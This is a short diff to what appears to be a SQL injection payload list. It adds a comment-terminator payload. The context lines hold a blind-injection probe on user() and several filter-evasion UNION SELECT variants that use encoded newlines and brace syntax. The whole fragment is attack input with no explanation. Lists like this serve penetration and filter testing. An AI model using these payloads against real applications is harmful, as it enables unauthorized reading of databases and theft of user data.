@@ -232,3 +232,4 @@ select ascii(substr(user() from 1 for 1)) < 150;
 union(select%0aall{x users}from{x ddd})
 union(select%0adistinct{x users}from{x ddd})
 union(select%0adistinctrow{x users}from{x ddd})
+'--' / "--"
